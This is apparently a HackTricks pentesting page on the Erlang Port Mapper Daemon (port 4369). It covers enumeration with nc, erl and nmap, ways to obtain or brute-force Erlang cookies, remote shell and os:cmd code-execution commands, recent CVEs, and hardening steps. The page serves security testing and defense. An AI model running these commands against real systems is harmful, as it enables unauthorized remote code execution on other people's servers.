# 4369 Pentesting Erlang Port Mapper Daemon (epmd)

{{#include ../banners/hacktricks-training.md}}

## Basic Info

The **Erlang Port Mapper Daemon (epmd)** serves as a coordinator for distributed Erlang instances. It maps symbolic node names to the TCP port on which every node listens for **Erlang Distribution** traffic.

**Default port**: **4369/tcp**

```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```

`epmd` is shipped with Erlang/OTP and is therefore reachable on many Erlang–based products such as **RabbitMQ**, **Apache CouchDB**, **ejabberd**, **FreeSWITCH/Kazoo**, etc.

> Shadowserver Internet-wide scans (Dec 2023) still observed **>100 000** publicly reachable `epmd` services.

---

## Enumeration

### Manual

```bash
# ask epmd for the list of registered nodes (NAMESREQ = 110 = 0x6e)
echo -ne "\x00\x01\x6e" | nc -nv <IP> 4369
```

Or, using an Erlang shell:

```bash
# Install Erlang (Debian/Ubuntu example)
apt install erlang -y
# Query names table
erl -noshell -hidden -sname probe -eval 'io:format("~p~n", [net_adm:names("<IP>")]), halt().'
```

### Automatic

```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>
```

---

## Remote Code Execution via Distributed Erlang

`epmd` **itself is not the vulnerability**.  It merely exposes the TCP port of each node that participates in the Erlang Distribution protocol (usually 25672/tcp on RabbitMQ, random high port on CouchDB, …).  Once an attacker discovers that second port **and knows / guesses the node’s cookie**, they can join the cluster and execute arbitrary Erlang code.

### Leaking / Brute-forcing the Cookie

*    Default cookie file: `~/.erlang.cookie` (600).  Older server builds shipped predictable values such as `monster` (CouchDB ≤ 3.2.1 – see CVE-2022-24706 below).
*    For single-tenant containers the cookie is often baked into the image (check `vm.args`, `relx.config`, Helm charts, etc.).
*    Tools:  `epmd_bf.erl`, **ERLPopper** (2021, Python re-implementation),  Metasploit `auxiliary/scanner/erlang/epmd_cookie_bruteforce` (added MSF 6.3).

### Connecting and executing OS commands

```bash
# Interactive remote shell once the cookie is known
erl -name pwn@ATTACKER -setcookie <COOKIE> -remsh <NODE>@<HOST>

# Non-interactive RCE example (RabbitMQ)
HOME=/ erl -sname anon -setcookie <COOKIE> \
   -eval 'rpc:call("rabbit@localhost", os, cmd, ["id"]), halt().' -noshell
```

---

## Recent Vulnerabilities (2022-2025)

| Year | CVE / Advisory | Affected | Impact & Notes |
|------|----------------|----------|----------------|
|2025|CVE-2025-32433|Erlang/OTP `ssh` application|Unauthenticated RCE via crafted SSH messages. Although unrelated to `epmd`, exploitation is often preceded by an `epmd` scan to locate Erlang nodes.  Patch ≥ 27.3.3 (OTP 27), 26.2.5.11, 25.3.2.20.|
|2024|"Security Best Practices: epmd" (RabbitMQ blog) |RabbitMQ clusters|>85 000 public `epmd` instances make inter-node ports discoverable and pave the way for cookie attacks.  Blog walks through hardening steps: bind to localhost, firewall, or disable Distribution entirely.|
|2022|CVE-2022-24706|Apache CouchDB ≤ 3.2.1|Default cookie `monster` + externally exposed Distribution port ⇒ remote privilege-escalation/RCE.  Fixed in 3.2.2 (refuses to start with default cookie; binds `epmd` + distribution port to 127.0.0.1).|

---

## Hardening & Defensive Measures

1. **Restrict network exposure**
   * *Firewall*: only trusted management networks should reach 4369/tcp **and** the dynamically advertised distribution port (e.g., 25672/tcp for RabbitMQ).
   * Cloud SG example (AWS):
     ```bash
     aws ec2 authorize-security-group-ingress \
       --group-id sg-XXXX --protocol tcp --port 4369-4370 \
       --source-group sg-INTERNAL_ONLY
     ```

2. **Bind `epmd` to localhost or a dedicated VLAN**
   * Set env `ERL_EPMD_ADDRESS=127.0.0.1` **or** launch `epmd -address 127.0.0.1`.
   * Since OTP 24: `-start_epmd false` prevents the VM from auto-starting `epmd`.
   * Since OTP 23: `-no_epmd` completely disables the need for `epmd` when you use static node configuration.

3. **Encrypt Erlang Distribution**  (still uses `epmd` for discovery)
   * Run nodes with `-proto_dist inet_tls` and provide an `-ssl_dist_optfile` containing mutual-TLS settings (certs, `verify_peer`, etc.).  Only nodes with valid client certs will be able to complete the handshake and read the cookie.

4. **Rotate and protect cookies**
   * Generate 128-bit random values; store them in a secret manager (Kubernetes secret, Vault, AWS SM, …).
   * Ensure `~/.erlang.cookie` is `600` and owned by the release user.

5. **Monitor** Shodan/Censys/BinaryEdge for accidental exposure
   * Shodan query: `port:4369 "Erlang Port Mapper Daemon"`
   * BinaryEdge tag: `EPMD_SCANNER`.

---

## Shodan

* `port:4369 "Erlang Port Mapper Daemon"`
* `product:"epmd"`

---

## References

* RabbitMQ – Security Best Practices: epmd (blog, Dec 2024)  
* Apache CouchDB – CVE-2022-24706 advisory

{{#include ../banners/hacktricks-training.md}}
